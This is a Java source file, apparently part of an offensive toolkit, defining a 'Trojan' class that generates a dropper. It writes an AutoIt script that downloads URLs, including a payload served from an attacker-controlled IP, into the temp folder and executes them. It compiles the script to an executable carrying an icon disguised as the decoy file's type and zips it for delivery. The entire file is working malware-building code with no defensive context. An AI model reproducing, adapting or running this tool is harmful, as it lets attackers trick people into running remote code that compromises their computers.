import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Trojan {
    private static final String TROJAN_SOURCE_CODE_FILE = "trojan.txt";
    private static final String AUT2EXE = "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2exe/Aut2exe.exe";

    private String url1;
    private String url2;
    private String icon;
    private String outFile;
    private String ip;

    private String trojanCode = """
            #include <StaticConstants.au3>
            #include <WindowsConstants.au3>
            Local $urlsArray = StringSplit($urls, ",", 2 )
            For $url In $urlsArray
                $sFile = _DownloadFile($url)
                shellExecute($sFile)
            Next
            Func _DownloadFile($sURL)
                Local $hDownload, $sFile
                $sFile = StringRegExpReplace($sURL, "^.*/", "")
                $sFile = StringReplace($sFile, "#", "")
                $sDirectory = @TempDir & "/" & $sFile
                $hDownload = InetGet($sURL, $sDirectory, 17, 1)
                InetClose($hDownload)
                Return $sDirectory
            EndFunc   ;==>_GetURLImage
            """;

    public Trojan(String url1, String url2, String icon, String outFile, String ip) {
        this.url1 = url1;
        this.url2 = url2;
        String fileType = url1.substring(url1.lastIndexOf(".") + 1).replace("#", "");
        this.icon = setIcon(icon, fileType);
        this.outFile = outFile;
        this.ip = ip;
    }

    public void create(boolean mitm) throws IOException {
        String urls;
        if (mitm) {
            String nameOriginalFile = url1.substring(url1.lastIndexOf("/") + 1).replace("#", "");
            byte[] r = downloadFile(url1);
            try (FileOutputStream fos = new FileOutputStream("/var/www/html/temp_" + nameOriginalFile)) {
                fos.write(r);
            }

            urls = "Local $urls = \"http://" + ip + "/temp_" + nameOriginalFile + "," + url2 + "\"\n";
        } else {
            urls = "Local $urls = \"" + url1 + "," + url2 + "\"\n";
        }

        try (BufferedWriter trojanFile = new BufferedWriter(new FileWriter(TROJAN_SOURCE_CODE_FILE))) {
            trojanFile.write(urls + trojanCode);
        }
    }

    public void compile() throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder("wine", AUT2EXE, "/In", TROJAN_SOURCE_CODE_FILE, "/Out", outFile, "/Icon", icon);
        processBuilder.start();
    }

    private String setIcon(String icon, String fileType) {
        String iconsDirectory = new File("").getAbsolutePath() + "/icons";
        if (icon == null) {
            icon = iconsDirectory + "/" + fileType + ".ico";
        }

        if (!new File(icon).exists()) {
            System.out.println("[-] Can't find icon at " + icon);
            System.out.println("[-] Using generic icon.");
            icon = iconsDirectory + "/generic.ico";
        }
        return icon;
    }

    public void zip(String fileToZip) throws IOException {
        String zipName = outFile.split("/")[outFile.split("/").length - 1].split("\\.")[0];
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipName + ".zip"))) {
            File fileToZipFile = new File(fileToZip);
            try (FileInputStream fis = new FileInputStream(fileToZipFile)) {
                ZipEntry zipEntry = new ZipEntry(fileToZipFile.getName());
                zos.putNextEntry(zipEntry);
                byte[] bytes = new byte[1024];
                int length;
                while ((length = fis.read(bytes)) >= 0) {
                    zos.write(bytes, 0, length);
                }
            }
        }
    }

    private byte[] downloadFile(String urlString) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        InputStream inputStream = httpConn.getInputStream();
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = inputStream.read(buffer)) != -1) {
            outputStream.write(buffer, 0, bytesRead);
        }
        return outputStream.toByteArray();
    }
}
